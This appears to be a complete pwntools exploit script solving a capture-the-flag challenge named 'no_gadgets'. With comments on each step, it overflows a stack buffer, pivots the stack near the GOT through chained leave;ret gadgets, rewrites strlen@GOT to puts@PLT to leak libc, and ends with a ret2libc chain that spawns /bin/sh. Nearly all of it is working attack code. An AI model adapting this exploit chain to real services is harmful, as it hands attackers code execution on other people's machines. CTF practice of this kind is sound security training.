#!/usr/bin/python3
from pwn import *

e = ELF("../challenge/no_gadgets")
libc = ELF("../challenge/libc.so.6")
# p = e.process()
p = remote('127.0.0.1', 1337)

def send(data, prompt=False, leak=False):
    ret = None
    if prompt:
        p.recvuntil(b"Data: ")
    assert b"\n" not in data
    p.sendline(data)
    if leak:
        ret = p.recv(6)
        p.recv(1)   # newline
    p.recvline()
    return ret

got = 0x404000
new_rsp = got+0x800     # sufficiently large to not interfere with GOT
addr_switch = new_rsp + 0x100
# address of final rop chain
# also sufficiently large for system
addr_rop = new_rsp + 0x400

leave_ret = e.sym.main+157
fgets_gadget = e.sym.main+68    # fgets(rbp-0x80, 0x80, stdin) ; strlen(rbp-0x80) ; leave ; ret

# the idea of "switching" is 2 consecutive "leave ; ret" gadgets
# such that rbp is controlled to a value we want
# as our gets_gadget and fgets_gadget relies on rbp
# AND also ensuring rsp is a sufficiently large address
# such that the stack activity in the writable section doesn't interfere with GOT
# or cause a crash

# the first "leave ; ret" sets rbp to point to a pair of "saved rbp | return address"
# stored at `addr_switchX`, and call it new_rbp | new_ret
# and triggers a second "leave ; ret" to then pop new_rbp into rbp, and return to new_ret
# the 2nd "leave ; ret" also sets rsp to `addr_switchX`
# which for our purposes is a sufficiently large address
rbp_rip = lambda rbp, rip: p64(rbp) + p64(rip)
switch = lambda i: rbp_rip(addr_switch+0x10*(i-1), leave_ret)

# setup pivot to writable region
overflow  = b"\x00".ljust(0x80, b"A")
overflow += p64(new_rsp)	    # saved rbp
overflow += p64(fgets_gadget)	# return address
send(overflow, prompt=True)

# rsp -> [stack]
# rbp -> new_rsp
# fgets(rbp-0x80) -> fgets(new_rsp-0x80)

# overflow
data  = b"\x00".ljust(0x80, b"A")
data += rbp_rip(got+0x100, fgets_gadget)
# pad upto addr_switch
data += b"B" * (addr_switch - (new_rsp-0x80+len(data)))
# fgets(got) for a GOT overwrite
data += rbp_rip(got+0x80, fgets_gadget)	        # switch1
# fgets() for final ROP payload
data += rbp_rip(addr_rop, fgets_gadget)	        # switch2
send(data)

# rsp -> new_rsp+0x10 (+0x10 due to "pop rbp" and "ret")
# rbp -> got+0x100
# fgets(rbp-0x80) -> fgets(got+0x80)

# got+0x80
fake_rbp_rip  = switch(2)
# overflow to do switch1
fake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")
fake_rbp_rip += switch(1)
send(fake_rbp_rip)

# overwrite GOT
# change strlen@GOT -> puts@PLT
# so that strlen(buf) leaks puts@GOT
overwrite  = p64(e.plt.puts + 6)
overwrite += p64(e.plt.puts)        # strlen@GOT
overwrite += p64(e.plt.printf + 6)
overwrite += p64(e.plt.fgets + 6)

# after overwriting strlen@GOT -> puts@PLT
# the GOT buffer is printed back to us due to strlen(rbp-0x80)
# at the start of the buffer is puts@GOT
# (which is resolved by the time of the call to puts)
# so &puts is leaked
libc_leak = send(overwrite, leak=True)

libc_leak = u64(libc_leak + b"\x00\x00")
log.info(f"puts: {hex(libc_leak)}")

libc.address = libc_leak - libc.sym.puts
log.info(f"libc: {hex(libc.address)}")

# switch(2) is done immediately afterwards
# to then write data to addr_rop

# time for a classic ret2libc
# (addr_rop is sufficiently large enough for system's stack)

pop_rdi = libc.address + 0x2a3e5
ret = pop_rdi + 1

payload  = b"\x00".ljust(0x80, b"A")
payload += p64(0)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.sym.system)

send(payload)
p.interactive()
